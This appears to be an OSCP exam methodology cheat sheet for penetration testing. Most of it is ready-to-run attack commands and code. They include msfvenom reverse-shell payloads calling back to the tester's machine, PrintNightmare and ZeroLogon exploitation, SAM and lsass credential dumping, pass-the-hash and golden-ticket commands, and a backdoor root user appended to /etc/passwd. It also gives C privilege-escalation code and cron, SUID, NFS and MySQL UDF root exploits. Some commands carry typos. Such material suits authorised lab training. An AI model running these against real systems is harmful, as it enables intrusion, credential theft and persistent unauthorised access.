# OSCP & Methodology

_The following sequence should be followed accordingly if applicable to conduct an oragnaized penetration test to avoid rabbit holes for the OSCP._

## Pre-Foothold Testing

### Verify All Open TCP Ports

```
rscan $ip
```

### Web Application Testing

#### Source Code Review

Review source code and Page Contents With Burp Suite/Site Map. Add Target Scope under Target > Scope > Add

View Landing Page /

Add domain or hostname to Kali /etc/hosts file and review landing page /

#### General Scoping

* Discover Potential Filename patterns for custom bruteforcing directories and files.
* Discover usernames or email addresses with exiftool after downloading.
* Discover HTTP Server Version.
* Discover JavaScript Version.
* Search For JavaScript Known Version Vulnerabilities.
* Discover Web Application Name.
* Discover Web Application Version.
* Search For Web Application Known Version Vulnerabilities.
* check certificate if applicable.
* Discover Admin Login pages.
* Test For default credentials.
* Discover User Logins.
* Discover User Registrations.

#### Bruteforce Directories and Files

Be sure to test both http and https

Directories

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404
```

Files

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://$ip/FUZZ -fc 404
```

Words

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://$ip/FUZZ -fc 404
```

Extensions

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -u http://$ip/somedir/FUZZ.someExtension -fc 404
```

#### Hidden parameter discovery

Test for hidden paremeters on found endpoints or files

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://$ip/somefile?FUZZ=../../../../../../etc/passwd -v -fc 404 | grep URL
```

#### Retrieve Response Headers

Search headers such as _X-Powered-By_. This may reveal vulnerble versioning

```
curl -I http://$ip/
```

#### Run Nikto Vulnerability Scanner

```
nikto -h http://$ip
```

#### Command Injection

#### Local File inclusion

#### Remote File inclusion

#### SQL injection

**Authentication Bypass**

Manually confirm the results to then filter out unwanted responses by using --hh

```
wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "form" --hc 404 $url
```

```
wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "form" --hc 404 $url
```

#### XXE

#### XSS

### RPC Testing

#### Test For PrintNightmare

```
rpcdump.py @$ip | egrep 'MS-RPRN|MS-PAR'
```

If the output is the following contains the following, it is vulnerable.

```
Print System Aschronous Remote Protocol
Print System Remote Protocol
```

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=$tun0 lport=53 -f dll -o /opt/winreconpack/thescriptkid.dll
```

```
python3 printnightmare.py domain.local/user:password@$ip '\\$tun0\winreconpack\thescriptkid.dll'
```

### SMB Testing

#### Search SMB Known Version Vulnerabilities

#### Check For Shares using

```
smbclient -N -L //$ip/
```

```
cme smb $ip --shares -u "guest" -p ""
```

#### Test for URL File attacks

Test for URL File attacks by creating a file called "@somename.url" with the following contents, upload, spin up smbserver to capture hash

```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\EnterAttackerip\%USERNAME%.icon
IconIndex=1
```

Run Responder to capture hashes

```
/opt/Responder-3.1.3.0/Responder.py -I tun0
```

#### Test for read / upload access

Attempt to download and view share contents using valid credential / anonymous login / null session

```
smbmap -u guest -p "" -H $ip -A '.*' -R
```

#### Cpassword discovery

Search "Groups.xml" for cpassword decryption using

```
gpp-decrypt cpassword
```

#### lsass.zip lsass.dmp

search lsass.zip or lsass.dmp to use to dump credentials / keys / tickets

```
pypykatz lsa minidump "lsass.zip"
```

#### Alternate Data Streams (ADS)

Test for alternate data streams after discovering 0 byte files

```
allinfo filename
```

#### Check Password Policy

```
cme smb $ip --pass-pol -u guest -p ""
```

#### User Discovery

Check For users using valid credential / anonymous login / null session

```
cme smb $ip --users -u guest -p ""
```

```
cme smb $ip --rid-brute -u guest -p ""
```

#### Group discovery

check for groups using valid credential / anonymous login / null session

```
cme smb $ip --groups -u guest -p ""
```

#### Smbclient

Interactively access the smb shares using smbclient

```
smbclient //$ip/someshare -N
smbclient //$ip/someshare -U 'guest' -N
smbclient //$ip/someshare -U 'validuser' -p 'validpass'
```

### FTP Testing

#### Anonymous Access

Check for anonymous login guest, ftp, anonymous, anonymous@anonymous.com

```
ftp $ip
```

#### File Download

Type "passive" if needed to remove passive mode to be able to continue to access ftp. type "binary" first then get to download files

```
ftp> passive
ftp> binary
```

Rescursively download files via ftp

```
wget -r ftp://user:pass@ip/
```

If you find password-protected zip files use zip2john followed by john the hash\*

```
zip2john file.zip >> hashes.txt
john hashes.txt
```

#### Test For File Upload RCE

If ftp allows uploading of files and the webserver has an local file inclusion vulnerability you can upload a php shell and call the file from the webserver to gain a reverse shell maybe it’ll have functionality that auto-executes uploaded files periodically.

#### ProFTPd 1.3.5 - 'mod\_copy' Remote Command Execution

#### Meta Data

Extract meta data and may contain email addresses\*

```
exiftool file
```

### Active Directory Testing (No Creds)

#### Test for zeroLogon

```
python3 /opt/set_empty_pw.py dc-name $ip
```

```
secretsdump.py -just-dc $domain/dc-name\$@$ip
```

#### Test for information disclosure

```
ldapenum -d $domain
```

```
ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" "(objectclass=*)"
```

#### Test for UF\_DONT\_REQUIRE\_PREAUTH

```
GetNPUsers.py $domain/ -no-pass -usersfile users.txt -dc-ip $ip
```

#### Enumerate Users

```
kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $domain --dc $ip
```

## Windows Post-Foothold Testing

### Search Windows Kernel Vulnerabilities

```
systeminfo
```

```
wes /tmp/systeminfo.txt -c -e --definitions /opt/wesng/definitions.zip -i "Elevation Of Privilege" | egrep -i exploit-db
```

```
wes /tmp/systeminfo.txt -c -e --definitions /opt/wesng/definitions.zip -i 'Remote Code Execution' | egrep -i exploit-db
```

```
windows-exploit-suggester.py --systeminfo /tmp/systeminfo.txt -d /opt/winreconpack/2022-08-20-mssb.xls
```

### Test For Previously Used credentials

```
cmdkey /list
runas /savecred /user:someuser whoami.exe
```

### Test For abuseable privileges

```
whoami /priv
```

**SeBackupPrivilege**

```
reg.exe save hklm\sam sam.save
```

```
reg.exe save hklm\system system.save
```

```
secretsdump.py -sam sam.save -system system.save local
```

**SeRestorePrivilege**

```
SeRestoreAbuse.exe "cmd /c net user thescriptkid thescriptkid /add"
```

```
SeRestoreAbuse.exe "cmd /c net localgroup administrators thescriptkid /add"
```

```
secretsdump.py domain.local/user:password@$ip
```

**SeImpersonatePrivilege OR SeAssignPrimaryToken**

**RoguePotato**

If the machine is >= Windows 10 1809 & Windows Server 2019

```
socat tcp-listen:135,reuseaddr,fork tcp:Windowsip:9999
```

```
RoguePotato.exe -r Kali-ip -e "C:\full\path\to\malicious.exe" -l 9999
```

**JuicyPotato**

If the machine is < Windows 10 1809 < Windows Server 2019\*

```
juicypotato.exe -l 1337 -p c:\full\path\to\malicious.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} OR {4991d34b-80a1-4291-83b6-3328366b9097}
```

**PrintSpoofer**

```
printspoofer.exe -c "C:\full\path\to\malicious.exe" -i
```

**HotPotato**

Windows 7, 8, 10, Server 2008, and Server 2012

**SeDebugPrivilege**

**SeShutdownPrivilege**

```
shutdown /r /t 0
```

**SeTakeOwndershipPrivilege**

### Test For Plaintext passwords

#### In Unattended Files

```
type C:\Windows\Panther\Unattended.xml
```

```
type C:\Windows\Panther\Unattend\Unattended.xml
```

#### In Registries

```
reg query HKLM /f password /t REG_SZ /s
```

```
reg query HKCU /f password /t REG_SZ /s
```

#### In WinLogon

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

#### In SNMP Paraemeters

```
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

#### In Sticky Notes

```
type C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

#### In Clipboard

```
powershell -command "Get-Clipboard"
```

#### In VNC

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

#### In Putty

```
reg query HKEY_CURRENT_USER\Software\%username%\Putty\Sessions\ /f "Proxy" /s
```

#### In Powershell History

```
type $home\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### In IIS WebServer configs

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

```
type C:\inetpub\wwwroot\web.config | findstr connectionString
```

#### In WebServer Directories

```
findstr /si password *.txt *.ini *.config *.php *.pl *.xml *.xls *.xlsx *.csv *.doc *.docx
```

### Test For alwayselevated

Both must queryies must return `0x1`

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```
msfvenom -p windows/x64/shell_reverse_tcp HOST=$tun0 LPORT=53 -f msi -o thescriptkid.msi
```

```
msiexec /quiet /qn /i C:\Windows\Temp\thescriptkid.msi
```

### Test For AutoRuns

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

```
accesschk.exe -qlwv C:\path\to\executeable
```

### Test For Insecure Sam and System backups

```
accesschk.exe -qlv C:\Windows\repair\Sam
```

```
accesschk.exe -qlv C:\Windows\repair\System
```

### Unmount Disks

```
mountvol
```

### Non-default Programs Discovery

This may reveal vulnerable server software or client software to elevate privileges

```
dir "C:\Program Files"
```

```
dir "C:\Program Files (x86)"
```

```
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

```
accesschk.exe -uws "Everyone" "C:\Program Files"
```

### Test Services

```
wmic service get name,displayname,pathname,startmode
```

```
accesschk.exe /accepteula -uwcqv someuser *
```

```
sc.exe qc someservice
```

#### Insecure Service Executables

```
accesschk.exe -ulvqws everyone "C:\program files"
```

Or

```
icacls C:\path\to\insecureExecutable.exe
```

```
wmic service get name,pathname | findstr insecureExecutable.exe
```

```
sc qc someservice
```

```
accesschk.exe -qlcv someservice
```

```
icacls malicious.exe /grant Everyone:F
```

```
sc stop/start OR shutdown /r /t 0
```

#### Unquoted Service Paths

```
icacls C:\path\to\this directory\executable.exe
```

Create file at C:\path\to\this.exe

```
icacls C:\path\to\this.exe /grant Everyone:F
```

```
sc stop/start OR shutdown /r /t 0
```

#### Insecure Service Permissions

```
accesschk.exe /accepteula -uwcqv someuser *
```

```
accesschk.exe /accepteula -qlcv someservice
```

```
icacls malicious.exe /grant Everyone:F
```

```
sc config someservice binpath="C:\path\to\malicious.exe" obj= LocalSystem
```

```
sc stop/start someservice
```

#### Weak Registry Permissions

```
accesschk.exe -ulvqkws grouporuser HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
```

```
reg query \path\to\regservice
```

```
sc qc regservice
```

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regservice /v ImagePath /t REG_EXPAND_SZ /d C:\path\to\malicious.exe /f
```

### Test For Scheduled Tasks

```
schtasks /query /fo list /v | findstr /c:"User:" /c:"Run:" /c:"TaskName:" /c:"Start Time:" /c:"Last Run Time:" /c:"Start Time:"
```

```
schtasks /query /tn sometask /fo list /v
```

```
icacls C:\Path\to\taskExecutable
```

Read code if non EXE

```
type C:\Path\to\script
```

Replace / modify content for code execution

Force execution or wait for task to run

```
schtasks /run /tn sometask
```

### Test For StartUp Apps

```
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

### Test For Insecure GUI Apps

Search and run GUI Apps as they may be ran as a privileged user

```
tasklist /V
```

Research for ways to potentially open a cmd prompt

### Vulnerable Driver Software Discovery

List All Drivers

```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object   'Display Name', 'Start Mode', Path
```

Get information on specific driver software based on name

```
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,  
DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

### Windows Active Directory

#### Overpass The Hash

```
serkurlsa:logonpasswords
```

Copy user's NTML hash

```
serkurlsa::pth /user:compromised_user /domain:domain.com /ntml:copied_hash /run:PowerShell.exe
```

```
net use \\lateral-machine
```

```
.\psexec.exe \\lateral-machine cmd.exe
```

#### Pass the Ticket

```
kerberos::golden /user:compromised_user /domain:domain.com /sid:domain-sid /target:web.domain.com /service:http /rc4:service_hash /ptt
```

## Linux Post-Foothold Testing

### Test For Kernel Exploits

```
uname -a
```

```
cat /etc/issue
```

```
cat /etc/*-release
```

```
les.sh
```

### Test For sudo permissions

```
sudo -l
```

### General Scoping

```
grep -Ri 'db' /var/www --color=auto
```

```
grep -Ri 'sql' /var/www --color=auto
```

```
grep -Ri '$db_name' /var/www --color=auto
```

```
ls -lsa /tmp/
```

```
ls -lsa /dev/shm
```

```
ls -lsa /opt/
```

```
ls -lsa /
```

```
ls -ls /etc anything other than root:root root:fuse root:shadow root:dip
```

```
ls -lsa /etc | grep -i '.secret'
```

```
ls -lsaR /var/mail
```

```
ls -lsaR /var/spool/mail
```

```
ls -lsaR /home
```

```
mount
```

```
lsblk
```

```
cat /etc/fstab
```

### Vulnerable Driver Discovery

List drivers

```
lsmod
```

get libata driver information and version

```
modinfo libata
```

### Test SUDO

Reference https://gtfobins.github.io/

#### Nano

```
sudo find /bin -name nano -exec /bin/sh \;
```

#### Awk

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### Nmap

```
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```

#### Vim

```
sudo vim -c '!sh'
```

#### LD\_PRELOAD

create file as malicious.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

compile and load

```
gcc -fPIC -shared -o /tmp/malicious.so malicious.c -nostartfiles
```

```
sudo LD_PRELOAD=/tmp/malicious.so apache2
```

#### Shared Object Injection

```
find / -type f -perm -04000 -ls 2>/dev/null
```

Run strace on SUIDs to find "foundso.so"

```
strace /usr/local/bin/SuidFromPreviousOutput 2>&1 | grep -i -E "open|access|no such file"
```

```
mkdir /home/user/.config
```

```
cd /home/user/.config
```

create foundso.c

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```
gcc -shared -o /home/user/.config/foundso.so -fPIC /home/user/.config/foundso.c
/usr/local/bin/somesuid
```

```
sudo apache2 -f /etc/shadow
```

### Test SUID files

Reference https://gtfobins.github.io/ and google the rest not listed.

```
find / -perm /4000 2> /dev/null
```

### Test etc/passwd & etc/shadow

Test for readable / writeable /etc/passwd OR /etc/shadow

```
ls -la /etc/passwd /etc/shadow
```

#### Only if Both Readable

```
unshadow passwd shadow > unshadowed.txt
```

```
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

#### Writable etc/passwd

```
openssl passwd thescriptkid
```

```
echo 'thescriptkid:$1$ZEx4UyBv$/2BpqiGuy7vuNC7X9SsTO0:0:0:thescriptkid:/home/thescriptkid:/bin/bash' >> /etc/passwd
```

```
su thescriptkid
```

### Stored Passwords & Keys

#### OVPN Files

```
find / -iname "*.ovpn" 2> /dev/null
```

#### Irssi Files

```
find / -iname "config" 2> /dev/null | grep -i "irssi"
```

```
cat filename | grep -i passw
```

#### Bash History

```
cat /home/*/.bash_history | grep -i passw
```

#### SSH Keys

```
find / -name id_rsa 2> /dev/null
```

```
chmod 400 id_rsa
```

```
ssh -i id_rsa someuser@$ip
```

### Abusing Intended Functionality

**Symlinks**

**Nginx below 1.6.2-5+deb8u3** [**logrotate Local Privilege Escalation**](https://www.exploit-db.com/exploits/40768)

### Environment Variables

#### Path

```
find / -type f -perm -04000 -ls 2>/dev/null
```

```
strings /usr/local/bin/onfoundsuid
```

C functions such as setresgid, setresuid, and system are of interest and should be investigated. Relative path commands such as "service" apache2 start can be abused.

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

```
gcc /tmp/service.c -o /tmp/service
```

```
export PATH=/tmp:$PATH
```

```
/usr/local/bin/onfoundsuid
```

### Functions, ShellOpts & PS4

```
find / -type f -perm -04000 -ls 2>/dev/null
```

```
strings /usr/local/bin/onfoundsuid
```

C functions such as setresgid, setresuid, and system are of interest and should be investigated. Absolute or Relative path commands such as "service" can be abused by creating functions in the current shell session.

Method 1

```
function /usr/sbin/onfoundsuid() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```

```
export -f /usr/sbin/service
```

```
/usr/local/bin/onfoundsuid
```

Method 2

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && 
```

```
chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/onfoundsuid; set +x; /tmp/bash -p'
```

### Capabilities

```
getcap -r / 2>/dev/null
```

#### Python 2.6

```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron

```
cat /etc/crontab
```

#### Path

This abuses misconfigured path in "/etc/crontab". If a user has write permissions in the directory that is in the path. create a file with the same name as the cronjob with malicious contents.

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /writeable/directory/somefile
```

```
chmod +x /wrietable/directory/somefile
```

```
/tmp/bash -p
```

#### Wildcards

```
cat /etc/crontab
```

**Tar**

Exploitable if cronjob script that is using tar and has a wildcard \* Example: tar czf /tmp/backup.tar.gz \*

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
/home/user/--checkpoint=1
```

```
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

Wait for execution

```
/tmp/bash -p
```

#### File Overwrite

```
cat /etc/crontab
```

Exploitable if script is writeable by the current user

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/writable/writablescript
```

```
/tmp/bash -p
```

### NFS Root Squashing

Victim Machine

```
cat /etc/exports
```

Kali Machine

```
showmount -e ip
```

```
mount -o rw,vers=2 ip:/tmp /tmp/1
```

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/thescriptkid.c
```

```
gcc /tmp/1/x.c -o /tmp/1/thescriptkid
```

```
chmod +s /tmp/1/thescriptkid
```

Victim Machine

```
/tmp/thescriptkid
```

### Mysql

prequisites - a valid database

```
show databases;
```

```
CREATE FUNCTION sys_eval RETURNS INT SONAME 'lib_mysqludf_sys.so';
```

```
select sys_eval("cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash");
```

```
/var/tmp/bash -p
```

### Run LinPEAS

try passwords found in config PHP files
